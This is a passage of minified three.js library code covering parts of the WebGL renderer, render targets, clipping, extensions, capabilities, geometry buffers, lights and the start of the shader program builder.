THREE.OrthographicCamera(-1,1,1,-1,0,1),la=\nnew THREE.PerspectiveCamera,oa=new THREE.Mesh(new THREE.PlaneBufferGeometry(2,2),new THREE.MeshBasicMaterial({depthTest:!1,depthWrite:!1}));a=THREE.ShaderLib.cube;var ga=new THREE.Mesh(new THREE.BoxBufferGeometry(5,5,5),new THREE.ShaderMaterial({uniforms:a.uniforms,vertexShader:a.vertexShader,fragmentShader:a.fragmentShader,depthTest:!1,depthWrite:!1,side:THREE.BackSide}));ea.update(oa);ea.update(ga);c();this.context=x;this.capabilities=da;this.extensions=U;this.properties=Z;this.state=R;var ya=new THREE.WebGLShadowMap(this,\nS,ea);this.shadowMap=ya;var Da=new THREE.SpritePlugin(this,L),Ea=new THREE.LensFlarePlugin(this,O);this.getContext=function(){return x};this.getContextAttributes=function(){return x.getContextAttributes()};this.forceContextLoss=function(){U.get(\"WEBGL_lose_context\").loseContext()};this.getMaxAnisotropy=function(){return da.getMaxAnisotropy()};this.getPrecision=function(){return da.precision};this.getPixelRatio=function(){return $};this.setPixelRatio=function(a){void 0!==a&&($=a,this.setSize(ma.z,\nma.w,!1))};this.getSize=function(){return{width:ra,height:sa}};this.setSize=function(a,b,c){ra=a;sa=b;v.width=a*$;v.height=b*$;!1!==c&&(v.style.width=a+\"px\",v.style.height=b+\"px\");this.setViewport(0,0,a,b)};this.setViewport=function(a,b,c,d){R.viewport(ma.set(a,b,c,d))};this.setScissor=function(a,b,c,d){R.scissor(ua.set(a,b,c,d))};this.setScissorTest=function(a){R.setScissorTest(xa=a)};this.getClearColor=function(){return V};this.setClearColor=function(a,c){V.set(a);Y=void 0!==c?c:1;b(V.r,V.g,V.b,\nY)};this.getClearAlpha=function(){return Y};this.setClearAlpha=function(a){Y=a;b(V.r,V.g,V.b,Y)};this.clear=function(a,b,c){var d=0;if(void 0===a||a)d|=x.COLOR_BUFFER_BIT;if(void 0===b||b)d|=x.DEPTH_BUFFER_BIT;if(void 0===c||c)d|=x.STENCIL_BUFFER_BIT;x.clear(d)};this.clearColor=function(){this.clear(!0,!1,!1)};this.clearDepth=function(){this.clear(!1,!0,!1)};this.clearStencil=function(){this.clear(!1,!1,!0)};this.clearTarget=function(a,b,c,d){this.setRenderTarget(a);this.clear(b,c,d)};this.resetGLState=\nd;this.dispose=function(){P=[];M=-1;F=[];K=-1;v.removeEventListener(\"webglcontextlost\",e,!1)};this.renderBufferImmediate=function(a,b,c){R.initAttributes();var d=Z.get(a);a.hasPositions&&!d.position&&(d.position=x.createBuffer());a.hasNormals&&!d.normal&&(d.normal=x.createBuffer());a.hasUvs&&!d.uv&&(d.uv=x.createBuffer());a.hasColors&&!d.color&&(d.color=x.createBuffer());b=b.getAttributes();a.hasPositions&&(x.bindBuffer(x.ARRAY_BUFFER,d.position),x.bufferData(x.ARRAY_BUFFER,a.positionArray,x.DYNAMIC_DRAW),\nR.enableAttribute(b.position),x.vertexAttribPointer(b.position,3,x.FLOAT,!1,0,0));if(a.hasNormals){x.bindBuffer(x.ARRAY_BUFFER,d.normal);if(\"MeshPhongMaterial\"!==c.type&&\"MeshStandardMaterial\"!==c.type&&\"MeshPhysicalMaterial\"!==c.type&&c.shading===THREE.FlatShading)for(var e=0,f=3*a.count;e<f;e+=9){var g=a.normalArray,h=(g[e+0]+g[e+3]+g[e+6])/3,k=(g[e+1]+g[e+4]+g[e+7])/3,m=(g[e+2]+g[e+5]+g[e+8])/3;g[e+0]=h;g[e+1]=k;g[e+2]=m;g[e+3]=h;g[e+4]=k;g[e+5]=m;g[e+6]=h;g[e+7]=k;g[e+8]=m}x.bufferData(x.ARRAY_BUFFER,\na.normalArray,x.DYNAMIC_DRAW);R.enableAttribute(b.normal);x.vertexAttribPointer(b.normal,3,x.FLOAT,!1,0,0)}a.hasUvs&&c.map&&(x.bindBuffer(x.ARRAY_BUFFER,d.uv),x.bufferData(x.ARRAY_BUFFER,a.uvArray,x.DYNAMIC_DRAW),R.enableAttribute(b.uv),x.vertexAttribPointer(b.uv,2,x.FLOAT,!1,0,0));a.hasColors&&c.vertexColors!==THREE.NoColors&&(x.bindBuffer(x.ARRAY_BUFFER,d.color),x.bufferData(x.ARRAY_BUFFER,a.colorArray,x.DYNAMIC_DRAW),R.enableAttribute(b.color),x.vertexAttribPointer(b.color,3,x.FLOAT,!1,0,0));R.disableUnusedAttributes();\nx.drawArrays(x.TRIANGLES,0,a.count);a.count=0};this.renderBufferDirect=function(a,b,c,d,e,g){r(d);var f=s(a,b,d,e),k=!1;a=c.id+\"_\"+f.id+\"_\"+d.wireframe;a!==aa&&(aa=a,k=!0);b=e.morphTargetInfluences;if(void 0!==b){a=[];for(var m=0,k=b.length;m<k;m++){var l=b[m];a.push([l,m])}a.sort(h);8<a.length&&(a.length=8);for(var n=c.morphAttributes,m=0,k=a.length;m<k;m++)l=a[m],H[m]=l[0],0!==l[0]?(b=l[1],!0===d.morphTargets&&n.position&&c.addAttribute(\"morphTarget\"+m,n.position[b]),!0===d.morphNormals&&n.normal&&\nc.addAttribute(\"morphNormal\"+m,n.normal[b])):(!0===d.morphTargets&&c.removeAttribute(\"morphTarget\"+m),!0===d.morphNormals&&c.removeAttribute(\"morphNormal\"+m));f.getUniforms().setValue(x,\"morphTargetInfluences\",H);k=!0}b=c.index;m=c.attributes.position;!0===d.wireframe&&(b=ea.getWireframeAttribute(c));null!==b?(a=Ba,a.setIndex(b)):a=Aa;if(k){a:{var k=void 0,p;if(c instanceof THREE.InstancedBufferGeometry&&(p=U.get(\"ANGLE_instanced_arrays\"),null===p)){console.error(\"THREE.WebGLRenderer.setupVertexAttributes: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");\nbreak a}void 0===k&&(k=0);R.initAttributes();var l=c.attributes,f=f.getAttributes(),n=d.defaultAttributeValues,q;for(q in f){var v=f[q];if(0<=v){var u=l[q];if(void 0!==u){var w=x.FLOAT,C=u.array,t=u.normalized;C instanceof Float32Array?w=x.FLOAT:C instanceof Float64Array?console.warn(\"Unsupported data buffer format: Float64Array\"):C instanceof Uint16Array?w=x.UNSIGNED_SHORT:C instanceof Int16Array?w=x.SHORT:C instanceof Uint32Array?w=x.UNSIGNED_INT:C instanceof Int32Array?w=x.INT:C instanceof Int8Array?\nw=x.BYTE:C instanceof Uint8Array&&(w=x.UNSIGNED_BYTE);var C=u.itemSize,y=ea.getAttributeBuffer(u);if(u instanceof THREE.InterleavedBufferAttribute){var z=u.data,A=z.stride,u=u.offset;z instanceof THREE.InstancedInterleavedBuffer?(R.enableAttributeAndDivisor(v,z.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=z.meshPerAttribute*z.count)):R.enableAttribute(v);x.bindBuffer(x.ARRAY_BUFFER,y);x.vertexAttribPointer(v,C,w,t,A*z.array.BYTES_PER_ELEMENT,(k*A+u)*z.array.BYTES_PER_ELEMENT)}else u instanceof\nTHREE.InstancedBufferAttribute?(R.enableAttributeAndDivisor(v,u.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=u.meshPerAttribute*u.count)):R.enableAttribute(v),x.bindBuffer(x.ARRAY_BUFFER,y),x.vertexAttribPointer(v,C,w,t,0,k*C*u.array.BYTES_PER_ELEMENT)}else if(void 0!==n&&(w=n[q],void 0!==w))switch(w.length){case 2:x.vertexAttrib2fv(v,w);break;case 3:x.vertexAttrib3fv(v,w);break;case 4:x.vertexAttrib4fv(v,w);break;default:x.vertexAttrib1fv(v,w)}}}R.disableUnusedAttributes()}null!==\nb&&x.bindBuffer(x.ELEMENT_ARRAY_BUFFER,ea.getAttributeBuffer(b))}p=Infinity;null!==b?p=b.count:void 0!==m&&(p=m.count);q=c.drawRange.start;b=c.drawRange.count;m=null!==g?g.start:0;k=null!==g?g.count:Infinity;g=Math.max(0,q,m);p=Math.min(0+p,q+b,m+k)-1;p=Math.max(0,p-g+1);if(e instanceof THREE.Mesh)if(!0===d.wireframe)R.setLineWidth(d.wireframeLinewidth*(null===J?$:1)),a.setMode(x.LINES);else switch(e.drawMode){case THREE.TrianglesDrawMode:a.setMode(x.TRIANGLES);break;case THREE.TriangleStripDrawMode:a.setMode(x.TRIANGLE_STRIP);\nbreak;case THREE.TriangleFanDrawMode:a.setMode(x.TRIANGLE_FAN)}else e instanceof THREE.Line?(d=d.linewidth,void 0===d&&(d=1),R.setLineWidth(d*(null===J?$:1)),e instanceof THREE.LineSegments?a.setMode(x.LINES):a.setMode(x.LINE_STRIP)):e instanceof THREE.Points&&a.setMode(x.POINTS);c instanceof THREE.InstancedBufferGeometry?0<c.maxInstancedCount&&a.renderInstances(c,g,p):a.render(g,p)};this.render=function(a,c,d,e){if(!1===c instanceof THREE.Camera)console.error(\"THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.\");\nelse{var g=a.fog;aa=\"\";G=-1;T=null;!0===a.autoUpdate&&a.updateMatrixWorld();null===c.parent&&c.updateMatrixWorld();c.matrixWorldInverse.getInverse(c.matrixWorld);pa.multiplyMatrices(c.projectionMatrix,c.matrixWorldInverse);wa.setFromMatrix(pa);B.length=0;M=K=-1;L.length=0;O.length=0;va=this.localClippingEnabled;qa=ca.init(this.clippingPlanes,va,c);m(a,c);F.length=K+1;P.length=M+1;!0===N.sortObjects&&(F.sort(k),P.sort(l));qa&&ca.beginShadows();for(var f=B,h=0,p=0,n=f.length;p<n;p++){var v=f[p];v.castShadow&&\n(S.shadows[h++]=v)}S.shadows.length=h;ya.render(a,c);for(var f=B,r=v=0,s=0,u,w,C,t,H=c.matrixWorldInverse,y=0,z=0,J=0,A=0,h=0,p=f.length;h<p;h++)if(n=f[h],u=n.color,w=n.intensity,C=n.distance,t=n.shadow&&n.shadow.map?n.shadow.map.texture:null,n instanceof THREE.AmbientLight)v+=u.r*w,r+=u.g*w,s+=u.b*w;else if(n instanceof THREE.DirectionalLight){var D=ta.get(n);D.color.copy(n.color).multiplyScalar(n.intensity);D.direction.setFromMatrixPosition(n.matrixWorld);W.setFromMatrixPosition(n.target.matrixWorld);\nD.direction.sub(W);D.direction.transformDirection(H);if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.directionalShadowMap[y]=t;S.directionalShadowMatrix[y]=n.shadow.matrix;S.directional[y++]=D}else if(n instanceof THREE.SpotLight){D=ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(u).multiplyScalar(w);D.distance=C;D.direction.setFromMatrixPosition(n.matrixWorld);W.setFromMatrixPosition(n.target.matrixWorld);\nD.direction.sub(W);D.direction.transformDirection(H);D.coneCos=Math.cos(n.angle);D.penumbraCos=Math.cos(n.angle*(1-n.penumbra));D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.spotShadowMap[J]=t;S.spotShadowMatrix[J]=n.shadow.matrix;S.spot[J++]=D}else if(n instanceof THREE.PointLight){D=ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(n.color).multiplyScalar(n.intensity);\nD.distance=n.distance;D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.pointShadowMap[z]=t;void 0===S.pointShadowMatrix[z]&&(S.pointShadowMatrix[z]=new THREE.Matrix4);W.setFromMatrixPosition(n.matrixWorld).negate();S.pointShadowMatrix[z].identity().setPosition(W);S.point[z++]=D}else n instanceof THREE.HemisphereLight&&(D=ta.get(n),D.direction.setFromMatrixPosition(n.matrixWorld),D.direction.transformDirection(H),\nD.direction.normalize(),D.skyColor.copy(n.color).multiplyScalar(w),D.groundColor.copy(n.groundColor).multiplyScalar(w),S.hemi[A++]=D);S.ambient[0]=v;S.ambient[1]=r;S.ambient[2]=s;S.directional.length=y;S.spot.length=J;S.point.length=z;S.hemi.length=A;S.hash=y+\",\"+z+\",\"+J+\",\"+A+\",\"+S.shadows.length;qa&&ca.endShadows();fa.calls=0;fa.vertices=0;fa.faces=0;fa.points=0;void 0===d&&(d=null);this.setRenderTarget(d);f=a.background;null===f?b(V.r,V.g,V.b,Y):f instanceof THREE.Color&&b(f.r,f.g,f.b,1);(this.autoClear||\ne)&&this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil);f instanceof THREE.CubeTexture?(la.projectionMatrix.copy(c.projectionMatrix),la.matrixWorld.extractRotation(c.matrixWorld),la.matrixWorldInverse.getInverse(la.matrixWorld),ga.material.uniforms.tCube.value=f,ga.modelViewMatrix.multiplyMatrices(la.matrixWorldInverse,ga.matrixWorld),N.renderBufferDirect(la,null,ga.geometry,ga.material,ga,null)):f instanceof THREE.Texture&&(oa.material.map=f,N.renderBufferDirect(Ca,null,oa.geometry,\noa.material,oa,null));a.overrideMaterial?(e=a.overrideMaterial,q(F,c,g,e),q(P,c,g,e)):(R.setBlending(THREE.NoBlending),q(F,c,g),q(P,c,g));Da.render(a,c);Ea.render(a,c,ba);d&&ka.updateRenderTargetMipmap(d);R.setDepthTest(!0);R.setDepthWrite(!0);R.setColorWrite(!0)}};this.setFaceCulling=function(a,b){R.setCullFace(a);R.setFlipSided(b===THREE.FrontFaceDirectionCW)};this.allocTextureUnit=function(){var a=ia;a>=da.maxTextures&&console.warn(\"WebGLRenderer: trying to use \"+a+\" texture units while this GPU supports only \"+\nda.maxTextures);ia+=1;return a};this.setTexture2D=function(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTarget&&(a||(console.warn(\"THREE.WebGLRenderer.setTexture2D: don't use render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);ka.setTexture2D(b,c)}}();this.setTexture=function(){var a=!1;return function(b,c){a||(console.warn(\"THREE.WebGLRenderer: .setTexture is deprecated, use setTexture2D instead.\"),a=!0);ka.setTexture2D(b,c)}}();this.setTextureCube=\nfunction(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTargetCube&&(a||(console.warn(\"THREE.WebGLRenderer.setTextureCube: don't use cube render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);b instanceof THREE.CubeTexture||Array.isArray(b.image)&&6===b.image.length?ka.setTextureCube(b,c):ka.setTextureCubeDynamic(b,c)}}();this.getCurrentRenderTarget=function(){return J};this.setRenderTarget=function(a){(J=a)&&void 0===Z.get(a).__webglFramebuffer&&ka.setupRenderTarget(a);\nvar b=a instanceof THREE.WebGLRenderTargetCube,c;a?(c=Z.get(a),c=b?c.__webglFramebuffer[a.activeCubeFace]:c.__webglFramebuffer,X.copy(a.scissor),ja=a.scissorTest,ba.copy(a.viewport)):(c=null,X.copy(ua).multiplyScalar($),ja=xa,ba.copy(ma).multiplyScalar($));D!==c&&(x.bindFramebuffer(x.FRAMEBUFFER,c),D=c);R.scissor(X);R.setScissorTest(ja);R.viewport(ba);b&&(b=Z.get(a.texture),x.framebufferTexture2D(x.FRAMEBUFFER,x.COLOR_ATTACHMENT0,x.TEXTURE_CUBE_MAP_POSITIVE_X+a.activeCubeFace,b.__webglTexture,a.activeMipMapLevel))};\nthis.readRenderTargetPixels=function(a,b,c,d,e,f){if(!1===a instanceof THREE.WebGLRenderTarget)console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.\");else{var g=Z.get(a).__webglFramebuffer;if(g){var h=!1;g!==D&&(x.bindFramebuffer(x.FRAMEBUFFER,g),h=!0);try{var k=a.texture;k.format!==THREE.RGBAFormat&&u(k.format)!==x.getParameter(x.IMPLEMENTATION_COLOR_READ_FORMAT)?console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.\"):\nk.type===THREE.UnsignedByteType||u(k.type)===x.getParameter(x.IMPLEMENTATION_COLOR_READ_TYPE)||k.type===THREE.FloatType&&U.get(\"WEBGL_color_buffer_float\")||k.type===THREE.HalfFloatType&&U.get(\"EXT_color_buffer_half_float\")?x.checkFramebufferStatus(x.FRAMEBUFFER)===x.FRAMEBUFFER_COMPLETE?0<=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&x.readPixels(b,c,d,e,u(k.format),u(k.type),f):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete.\"):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.\")}finally{h&&\nx.bindFramebuffer(x.FRAMEBUFFER,D)}}}}};\nTHREE.WebGLRenderTarget=function(a,b,c){this.uuid=THREE.Math.generateUUID();this.width=a;this.height=b;this.scissor=new THREE.Vector4(0,0,a,b);this.scissorTest=!1;this.viewport=new THREE.Vector4(0,0,a,b);c=c||{};void 0===c.minFilter&&(c.minFilter=THREE.LinearFilter);this.texture=new THREE.Texture(void 0,void 0,c.wrapS,c.wrapT,c.magFilter,c.minFilter,c.format,c.type,c.anisotropy,c.encoding);this.depthBuffer=void 0!==c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void 0!==c.stencilBuffer?c.stencilBuffer:\n!0;this.depthTexture=null};\nObject.assign(THREE.WebGLRenderTarget.prototype,THREE.EventDispatcher.prototype,{setSize:function(a,b){if(this.width!==a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,b)},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.width=a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone();this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;\nreturn this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});THREE.WebGLRenderTargetCube=function(a,b,c){THREE.WebGLRenderTarget.call(this,a,b,c);this.activeMipMapLevel=this.activeCubeFace=0};THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype);THREE.WebGLRenderTargetCube.prototype.constructor=THREE.WebGLRenderTargetCube;\nTHREE.WebGLBufferRenderer=function(a,b,c){var d;this.setMode=function(a){d=a};this.render=function(b,f){a.drawArrays(d,b,f);c.calls++;c.vertices+=f;d===a.TRIANGLES&&(c.faces+=f/3)};this.renderInstances=function(e){var f=b.get(\"ANGLE_instanced_arrays\");if(null===f)console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");else{var g=e.attributes.position,h=0,h=g instanceof THREE.InterleavedBufferAttribute?g.data.count:\ng.count;f.drawArraysInstancedANGLE(d,0,h,e.maxInstancedCount);c.calls++;c.vertices+=h*e.maxInstancedCount;d===a.TRIANGLES&&(c.faces+=e.maxInstancedCount*h/3)}}};\nTHREE.WebGLClipping=function(){function a(){l.value!==d&&(l.value=d,l.needsUpdate=0<e);c.numPlanes=e}function b(a,b,d,e){var f=null!==a?a.length:0,g=null;if(0!==f){g=l.value;if(!0!==e||null===g){e=d+4*f;b=b.matrixWorldInverse;k.getNormalMatrix(b);if(null===g||g.length<e)g=new Float32Array(e);for(e=0;e!==f;++e,d+=4)h.copy(a[e]).applyMatrix4(b,k),h.normal.toArray(g,d),g[d+3]=h.constant}l.value=g;l.needsUpdate=!0}c.numPlanes=f;return g}var c=this,d=null,e=0,f=!1,g=!1,h=new THREE.Plane,k=new THREE.Matrix3,\nl={value:null,needsUpdate:!1};this.uniform=l;this.numPlanes=0;this.init=function(a,c,g){var h=0!==a.length||c||0!==e||f;f=c;d=b(a,g,0);e=a.length;return h};this.beginShadows=function(){g=!0;b(null)};this.endShadows=function(){g=!1;a()};this.setState=function(c,h,k,q,r){if(!f||null===c||0===c.length||g&&!h)g?b(null):a();else{h=g?0:e;var s=4*h,t=q.clippingState||null;l.value=t;t=b(c,k,s,r);for(c=0;c!==s;++c)t[c]=d[c];q.clippingState=t;this.numPlanes+=h}}};\nTHREE.WebGLIndexedBufferRenderer=function(a,b,c){var d,e,f;this.setMode=function(a){d=a};this.setIndex=function(c){c.array instanceof Uint32Array&&b.get(\"OES_element_index_uint\")?(e=a.UNSIGNED_INT,f=4):(e=a.UNSIGNED_SHORT,f=2)};this.render=function(b,h){a.drawElements(d,h,e,b*f);c.calls++;c.vertices+=h;d===a.TRIANGLES&&(c.faces+=h/3)};this.renderInstances=function(g,h,k){var l=b.get(\"ANGLE_instanced_arrays\");null===l?console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\"):\n(l.drawElementsInstancedANGLE(d,k,e,h*f,g.maxInstancedCount),c.calls++,c.vertices+=k*g.maxInstancedCount,d===a.TRIANGLES&&(c.faces+=g.maxInstancedCount*k/3))}};\nTHREE.WebGLExtensions=function(a){var b={};this.get=function(c){if(void 0!==b[c])return b[c];var d;switch(c){case \"WEBGL_depth_texture\":d=a.getExtension(\"WEBGL_depth_texture\")||a.getExtension(\"MOZ_WEBGL_depth_texture\")||a.getExtension(\"WEBKIT_WEBGL_depth_texture\");break;case \"EXT_texture_filter_anisotropic\":d=a.getExtension(\"EXT_texture_filter_anisotropic\")||a.getExtension(\"MOZ_EXT_texture_filter_anisotropic\")||a.getExtension(\"WEBKIT_EXT_texture_filter_anisotropic\");break;case \"WEBGL_compressed_texture_s3tc\":d=\na.getExtension(\"WEBGL_compressed_texture_s3tc\")||a.getExtension(\"MOZ_WEBGL_compressed_texture_s3tc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_s3tc\");break;case \"WEBGL_compressed_texture_pvrtc\":d=a.getExtension(\"WEBGL_compressed_texture_pvrtc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_pvrtc\");break;case \"WEBGL_compressed_texture_etc1\":d=a.getExtension(\"WEBGL_compressed_texture_etc1\");break;default:d=a.getExtension(c)}null===d&&console.warn(\"THREE.WebGLRenderer: \"+c+\" extension not supported.\");\nreturn b[c]=d}};\nTHREE.WebGLCapabilities=function(a,b,c){function d(b){if(\"highp\"===b){if(0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.HIGH_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.HIGH_FLOAT).precision)return\"highp\";b=\"mediump\"}return\"mediump\"===b&&0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.MEDIUM_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.MEDIUM_FLOAT).precision?\"mediump\":\"lowp\"}var e;this.getMaxAnisotropy=function(){if(void 0!==e)return e;var c=b.get(\"EXT_texture_filter_anisotropic\");\nreturn e=null!==c?a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0};this.getMaxPrecision=d;this.precision=void 0!==c.precision?c.precision:\"highp\";this.logarithmicDepthBuffer=void 0!==c.logarithmicDepthBuffer?c.logarithmicDepthBuffer:!1;this.maxTextures=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS);this.maxVertexTextures=a.getParameter(a.MAX_VERTEX_TEXTURE_IMAGE_UNITS);this.maxTextureSize=a.getParameter(a.MAX_TEXTURE_SIZE);this.maxCubemapSize=a.getParameter(a.MAX_CUBE_MAP_TEXTURE_SIZE);this.maxAttributes=\na.getParameter(a.MAX_VERTEX_ATTRIBS);this.maxVertexUniforms=a.getParameter(a.MAX_VERTEX_UNIFORM_VECTORS);this.maxVaryings=a.getParameter(a.MAX_VARYING_VECTORS);this.maxFragmentUniforms=a.getParameter(a.MAX_FRAGMENT_UNIFORM_VECTORS);this.vertexTextures=0<this.maxVertexTextures;this.floatFragmentTextures=!!b.get(\"OES_texture_float\");this.floatVertexTextures=this.vertexTextures&&this.floatFragmentTextures;c=d(this.precision);c!==this.precision&&(console.warn(\"THREE.WebGLRenderer:\",this.precision,\"not supported, using\",\nc,\"instead.\"),this.precision=c);this.logarithmicDepthBuffer&&(this.logarithmicDepthBuffer=!!b.get(\"EXT_frag_depth\"))};\nTHREE.WebGLGeometries=function(a,b,c){function d(a){var h=a.target;a=f[h.id];null!==a.index&&e(a.index);var k=a.attributes,l;for(l in k)e(k[l]);h.removeEventListener(\"dispose\",d);delete f[h.id];l=b.get(h);l.wireframe&&e(l.wireframe);b.delete(h);h=b.get(a);h.wireframe&&e(h.wireframe);b.delete(a);c.memory.geometries--}function e(c){var d;d=c instanceof THREE.InterleavedBufferAttribute?b.get(c.data).__webglBuffer:b.get(c).__webglBuffer;void 0!==d&&(a.deleteBuffer(d),c instanceof THREE.InterleavedBufferAttribute?\nb.delete(c.data):b.delete(c))}var f={};this.get=function(a){var b=a.geometry;if(void 0!==f[b.id])return f[b.id];b.addEventListener(\"dispose\",d);var e;b instanceof THREE.BufferGeometry?e=b:b instanceof THREE.Geometry&&(void 0===b._bufferGeometry&&(b._bufferGeometry=(new THREE.BufferGeometry).setFromObject(a)),e=b._bufferGeometry);f[b.id]=e;c.memory.geometries++;return e}};\nTHREE.WebGLLights=function(){var a={};this.get=function(b){if(void 0!==a[b.id])return a[b.id];var c;switch(b.type){case \"DirectionalLight\":c={direction:new THREE.Vector3,color:new THREE.Color,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new THREE.Vector2};break;case \"SpotLight\":c={position:new THREE.Vector3,direction:new THREE.Vector3,color:new THREE.Color,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new THREE.Vector2};break;case \"PointLight\":c=\n{position:new THREE.Vector3,color:new THREE.Color,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new THREE.Vector2};break;case \"HemisphereLight\":c={direction:new THREE.Vector3,skyColor:new THREE.Color,groundColor:new THREE.Color}}return a[b.id]=c}};\nTHREE.WebGLObjects=function(a,b,c){function d(c,d){var e=c instanceof THREE.InterleavedBufferAttribute?c.data:c,f=b.get(e);void 0===f.__webglBuffer?(f.__webglBuffer=a.createBuffer(),a.bindBuffer(d,f.__webglBuffer),a.bufferData(d,e.array,e.dynamic?a.DYNAMIC_DRAW:a.STATIC_DRAW),f.version=e.version):f.version!==e.version&&(a.bindBuffer(d,f.__webglBuffer),!1===e.dynamic||-1===e.updateRange.count?a.bufferSubData(d,0,e.array):0===e.updateRange.count?console.error(\"THREE.WebGLObjects.updateBuffer: dynamic THREE.BufferAttribute marked as needsUpdate but updateRange.count is 0, ensure you are using set methods or updating manually.\"):\n(a.bufferSubData(d,e.updateRange.offset*e.array.BYTES_PER_ELEMENT,e.array.subarray(e.updateRange.offset,e.updateRange.offset+e.updateRange.count)),e.updateRange.count=0),f.version=e.version)}function e(a,b,c){if(b>c){var d=b;b=c;c=d}d=a[b];return void 0===d?(a[b]=[c],!0):-1===d.indexOf(c)?(d.push(c),!0):!1}var f=new THREE.WebGLGeometries(a,b,c);this.getAttributeBuffer=function(a){return a instanceof THREE.InterleavedBufferAttribute?b.get(a.data).__webglBuffer:b.get(a).__webglBuffer};this.getWireframeAttribute=\nfunction(c){var f=b.get(c);if(void 0!==f.wireframe)return f.wireframe;var k=[],l=c.index,n=c.attributes;c=n.position;if(null!==l)for(var n={},l=l.array,p=0,m=l.length;p<m;p+=3){var q=l[p+0],r=l[p+1],s=l[p+2];e(n,q,r)&&k.push(q,r);e(n,r,s)&&k.push(r,s);e(n,s,q)&&k.push(s,q)}else for(l=n.position.array,p=0,m=l.length/3-1;p<m;p+=3)q=p+0,r=p+1,s=p+2,k.push(q,r,r,s,s,q);k=new THREE.BufferAttribute(new (65535<c.count?Uint32Array:Uint16Array)(k),1);d(k,a.ELEMENT_ARRAY_BUFFER);return f.wireframe=k};this.update=\nfunction(b){var c=f.get(b);b.geometry instanceof THREE.Geometry&&c.updateFromObject(b);b=c.index;var e=c.attributes;null!==b&&d(b,a.ELEMENT_ARRAY_BUFFER);for(var l in e)d(e[l],a.ARRAY_BUFFER);b=c.morphAttributes;for(l in b)for(var e=b[l],n=0,p=e.length;n<p;n++)d(e[n],a.ARRAY_BUFFER);return c}};\nTHREE.WebGLProgram=function(){function a(a){switch(a){case THREE.LinearEncoding:return[\"Linear\",\"( value )\"];case THREE.sRGBEncoding:return[\"sRGB\",\"( value )\"];case THREE.RGBEEncoding:return[\"RGBE\",\"( value )\"];case THREE.RGBM7Encoding:return[\"RGBM\",\"( value, 7.0 )\"];case THREE.RGBM16Encoding:return[\"RGBM\",\"( value, 16.0 )\"];case THREE.RGBDEncoding:return[\"RGBD\",\"( value, 256.0 )\"];case THREE.GammaEncoding:return[\"Gamma\",\"( value, float( GAMMA_FACTOR ) )\"];default:throw Error(\"unsupported encoding: \"+\na);}}function b(b,c){var d=a(c);return\"vec4 \"+b+\"( vec4 value ) { return \"+d[0]+\"ToLinear\"+d[1]+\"; }\"}function c(b,c){var d=a(c);return\"vec4 \"+b+\"( vec4 value ) { return LinearTo\"+d[0]+d[1]+\"; }\"}function d(a,b){var c;switch(b){case THREE.LinearToneMapping:c=\"Linear\";break;case THREE.ReinhardToneMapping:c=\"Reinhard\";break;case THREE.Uncharted2ToneMapping:c=\"Uncharted2\";break;case THREE.CineonToneMapping:c=\"OptimizedCineon\";break;default:throw Error(\"unsupported toneMapping: \"+b);}return\"vec3 \"+a+\n\"( vec3 color ) { return \"+c+\"ToneMapping( color ); }\"}function e(a,b,c){a=a||{};return[a.derivatives||b.envMapCubeUV||b.bumpMap||b.normalMap||b.flatShading?\"#extension GL_OES_standard_derivatives : enable\":\"\",(a.fragDepth||b.logarithmicDepthBuffer)&&c.get(\"EXT_frag_depth\")?\"#extension GL_EXT_frag_depth : 